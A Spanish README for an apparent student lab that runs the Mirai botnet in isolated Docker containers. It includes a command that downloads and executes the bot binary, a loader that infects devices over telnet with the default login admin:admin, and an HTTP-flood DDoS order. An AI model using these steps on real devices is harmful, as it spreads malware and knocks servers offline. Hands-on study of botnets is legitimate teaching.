# unit-tfg-mirai

## Requisitos

El laboratorio se ha preparado para ser ejecutado en un entorno Unix (por ejemplo, Linux o MacOS). Si solo se dispone de Windows, se puede intentar ejecutar bajo
[Windows Subsystem for Linux](https://ubuntu.com/wsl), aunque no se garantiza que funcione.

Para ejecutar el laboratorio es necesario tener instalado [docker](https://www.docker.com/).

## Construir el laboratorio

Para preparar el laboratorio es necesario descargar varios archivos y compilar los ajecutables del CNC, bots y otros programas auxiliares.

Para simplificar la tarea en lo posible, se ha creado un script, `construir-lab.sh`. Para ello, desde la carpeta del proyecto en la línea de comandos, ejecutar:

```bash
./construir-lab.sh
```

Este comando tardará varios minutos en ejecutarse. Los pasos que realizará son:

- Descargar archivos externos necesarios.
- Preparar un entorno de compilación en Docker que permita generar ejecutables para distintos procesadores.
- Compilar el CNC, el loader y los bots para diferentes procesadores.
- Crear imágenes docker con el CNC, el loader y los bots.
- Crear una subred docker llamada `mirai-net` (172.20.0.0/16).

A continuación se deberá realizar varios pasos manualmente:

Se deben añadir las siguientes líneas al archivo local `/etc/hosts`:

```
172.20.250.250    cnc.domain
172.20.250.251    loader.domain
```

En Windows, este archivo se encuentra en `C:\Windows\System32\drivers\etc\hosts`.

## Comprobación manual

Para comprobar que el sistema funciona, ejecútense los siguientes pasos en las ventanas de
línea de comandos indicadas:

#### Ventana 1 - Ejecutar bot

Ejecutamos un bot:

```bash
docker run -td --net mirai-net --ip 172.20.1.1 --name bot1 mirai-bot
```

Lo dejamos corriendo en segundo plano y más tarde regresaremos a esta ventana.

#### Ventana 2 - Arrancar CNC

Arrancamos el CNC:

```bash
docker run -p 2323:23 -p 8080:80 --net mirai-net --ip 172.20.250.250 --name cnc mirai-cnc
```

Lo dejamos corriendo en primer plano. Luego podrmos ver las conexiones, tando de los administradores como de los bots.

#### Ventana 3 - Conectar al CNC

Nos conectamos al CNC via telnet:

```bash
docker run -ti --net mirai-net --entrypoint "telnet" telnet cnc.domain 23
  [enter]
  mirai
  password
```

Una vez dentro, se puede ejecutar `help` para ver la lista de ataques disponibles, `botcount`
(o `bc`) para ver el número de bots conectados y con `exit` se cerrará la conexión.

Si ejecutamos `botcount` ahora veremos que hay 0.

#### Ventana 4 - Levantar y monitoriear servidor web

Levantamos un navegador web, que será atacado por los bots (solo uno en este caso):

```bash
docker run -it --rm -d -p 8000:80 --net mirai-net --ip 172.20.80.80 --name web nginx
```

Podemos comprobar que el servidor web está en funcionamiento visitando con nuestro navegador web la URL
<http://localhost:8000>.

Monitoreamos el servidor web utilizando la herramienta `tcpdump`:

```bash
docker run --net container:web nicolaka/netshoot tcpdump -i eth0 not arp
```

Para ver el tráfico generado por el servidor web en tiempo real, podemos visitar otra URL, por ejemplo
<http://localhost:8000/pagina_inexistente.html>. Veremos la petición y la respuesta `404 Not Found`.

### Ventana 1 - Infectar bot

Es el momento de infectar el bot 1, y lo haremos manualmente.

Abrimos una sesión (como si nos conectásemos por telnet o ssh):

```bash
docker exec -it bot1 sh
```

Una vez dentro, ejecutamos:

```bash
busybox wget http://172.20.250.250:80/bins/mirai.x86 -O - > drvHelper && chmod 777 drvHelper && ./drvHelper
```

Esto descargará el malware del CNC y lo ejecutará.

Ahora el bot hará dos cosas:

1) Se conectará con el CNC para decirle que está disponible y esperará instrucciones.
2) Buscará otras víctimas y, si las encuentra, informará al componente scanListen del CNC.

### Ventana 2 - Ver conexiones al CNC

Deben de poder verse las conexiones que se han realizado al CNC.

### Ventana 3 - Lanzar ataque

Regresamos al panel de control del CNC.

Podemos ejecutar `botcount` para comprobar que hay un bot conectado.

Con `help` vemos los ataques disponibles.

Vamos a lanzar un ataque "coordinado" conocido como "HTTP flood null headers" al servidor web que hemos levantado:

```
httpnull 172.20.80.80 15 domain=172.20.80.80
```

#### Ventana 1 - Ver bot infectando

En estos momentos, el bot 1 abrá conectado con el servidor web y estará lanzando constantemente
peticiones (_payload_) con cabeceras especialmente diseñadas para sobrecargarlo (cuando se realiza en grandes
cantidades simultáneamente; un solo bot no va a tumbar a ningún servidor web).

#### Ventana 4 - Ver tráfico generado por la botnet

El programa `tcpdump` debe estar mostrando gran cantidad de peticiones.

¡Enhorabuena! Has lanzado tu primer ataque con un bot.

#### Ventana 5 - Detener

Abrimos una nueva ventana de comandos y ejecutamos:

```bash
docker kill `docker ps -a -q` ; docker system prune -f
```

Esto detendrá todos los contenedores docker en ejecución y liberará espacio ocupado por los mismos aun después
de haber terminado.

## Ataque automático

Si se ha realizado la prueba manual, se recomienda ejecutar

```bash
docker kill `docker ps -a -q` ; docker system prune -f && ./construir-lab.sh
```

y cerrar todas las ventanas de línea de comandos que se tengan abiertas antes de cotinuar.

Para realizar un ataque más realista, dentro de las restricciones impuestas por la ejecución en una única máquina,
los pasos son los siguientes:

#### Ventana 1 - Crear dispositivos

Ejecutamos 20 máquinas virtuales (se puede cambiar el número asignándole otro valor a la variable `NUM_BOTS`):

```bash
NUM_BOTS=20 ; for i in {1..$NUM_BOTS} ; do docker run -td --net mirai-net --ip 172.20.1.$i --name bot$i mirai-bot ; done
```

Nótese que estas máquinas ahora mismo son solo dispositivos normales conectados a la subred,
como podría ser un router, una cámara de vigilancia o un frigorifico. Aun no están infectados ni están conectados al CNC.

El único problema que presentan, como muchos dispositivos reales, es que tienen una contraseña muy fácil de adivinar
(`admin:admin` en este caso). Podemos conectarnos a cualquiera de ellos, de hecho:

```bash
docker run -ti --net mirai-net --entrypoint "telnet" telnet 172.20.1.12 23
```

#### Ventana 2 - Arrancar CNC

Arrancamos el CNC:

```bash
docker run -p 2323:23 -p 8080:80 --net mirai-net --ip 172.20.250.250 --name cnc mirai-cnc
```

Lo dejamos corriendo en primer plano. Luego podremos ver las conexiones, tando de los administradores como de los bots.

#### Ventana 3 - Conectar al panel de control del CNC

Nos conectamos al CNC via telnet:

```bash
docker run -ti --net mirai-net --entrypoint "telnet" telnet cnc.domain 23
  [enter]
  mirai
  password
```

Una vez dentro, se puede ejecutar `help` para ver la lista de ataques disponibles, `botcount`
(o `bc`) para ver el número de bots conectados y con `exit` se cerrará la conexión.

Si ejecutamos `botcount` ahora, veremos que hay 0 bots conectados.

#### Ventana 4 - Levantar y monitorear servidor web

Levantamos un servidor web, que será atacado por los bots:

```bash
docker run -it --rm -d -p 8000:80 --net mirai-net --ip 172.20.80.80 --name web nginx
```

Monitoreamos el servidor web utilizando la herramienta `tcpdump`:

```bash
docker run --net container:web nicolaka/netshoot tcpdump -i eth0 not arp and not icmp
```

Podemos comprobar que el servidor web está en funcionamiento visitando con nuestro navegador web la URL
<http://localhost:8000>. Veremos la petición y la respuesta `200 Ok` en tcpdump.

### Ventana 5 - Infectar dispositivos iniciales

En la vida real, para iniciar una botnet, se debe disponer de uno o varios dispositivos a los que infectar
inicialmente, que se encargarán de buscar otros dispositivos vulnerables a los que propagarse, y éstos a otros,
y así sucesivamente.

Bosotros comenzaremos infectando la máquina bot1 (172.20.1.1) y ésta se encargará de encontrar otras a las que infectar.

Para iniciar la infeción, lanzaremos el siguiente comando:

```bash
docker run --net mirai-net --ip 172.20.250.251 --entrypoint /bin/loader mirai-loader 172.20.1.1:23 admin:admin
```

Esto intentará infectar a los dos primeros bots, con las direcciones IP 172.20.1.1 y 172.20.1.2.
Éstos se encargarán de buscar otros dispositivos a los que infectar.

### Ventana 2 - Ver conexiones al CNC

Deben de poder verse las conexiones que se están realizado al CNC; primero los bots 1 y 2 y después los demás.

### Ventana 3 - Lanzar ataque

Regresamos al panel de control del CNC.

Podemos ejecutar `botcount` para comprobar que haya un cierto número de bots conectados. Con 5 es más que suficiente,
pero nosotros esperaremos a tener más de 10.

Cuando tengamos el número de bots deseado, podemos ver los ataques disponibles con `help`.

Vamos a lanzar un ataque coordinado conocido como "HTTP flood null headers" al servidor web que hemos levantado anteriormente:

```
httpnull 172.20.80.80 15 domain=172.20.80.80
```

#### Ventana 4 - Ver tráfico generado por la botnet

El programa `tcpdump` debe estar mostrando gran cantidad de peticiones de todos los bots.

¡Enhorabuena! Has lanzado tu primer ataque con una botnet.

#### Ventana 5 - Detener

Abrimos una nueva ventana de comandos y ejecutamos:

```bash
docker kill `docker ps -a -q` ; docker system prune -f
```

Esto detendrá todos los contenedores docker en ejecución y liberará espacio ocupado por los mismos aun después
de haber terminado.
